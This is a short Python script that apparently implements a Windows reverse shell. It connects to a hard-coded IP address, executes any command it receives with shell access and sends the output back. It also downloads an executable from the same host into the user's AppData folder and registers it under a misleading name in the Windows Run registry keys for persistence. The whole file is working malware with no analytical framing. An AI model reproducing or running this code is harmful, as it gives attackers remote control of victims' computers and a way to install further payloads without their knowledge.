import socket
import os
import subprocess
import requests

def connect_to_server():
    s = socket.socket()
    host = '50.116.8.102'
    port = 9999

    s.connect((host, port))

    while True:
        data = s.recv(1024)
        if data[:2].decode("utf-8") == 'cd':
            os.chdir(data[3:].decode("utf-8"))

        if len(data) > 0:
            cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
            output_byte = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_byte,"utf-8")
            currentWD = os.getcwd() + "> "
            s.send(str.encode(output_str + currentWD))

            print(output_str)

def persist():
    running_dir = os.getcwd()
    if running_dir == f"{os.environ['APPDATA']}/Reverse Shell":
        print('Persistence achieved...')
        return True
    else:
        os.chdir(os.environ['APPDATA'])
        try:
            os.mkdir('Reverse Shell')
            os.chdir('Reverse Shell')
            response = requests.get('http://50.116.8.102/client.exe')
            open('client.exe', 'wb').write(response.content)
            command = f'REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v ManagerAsset /t REG_SZ /d "{os.environ["APPDATA"]}\\Reverse Shell\\client.exe"'
            os.system(command)
            os.system(
                f'REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v ManagerAsset /t REG_SZ /d "{os.environ["APPDATA"]}\\Reverse Shell\\client.exe"')

        except FileExistsError:
            os.chdir('Reverse Shell')
            persistent = os.path.exists('client.exe')
            if not persistent:
                response = requests.get('http://50.116.8.102/client.exe')
                open('client.exe', 'wb').write(response.content)
                return True
        os.chdir(running_dir)

persist()
connect_to_server()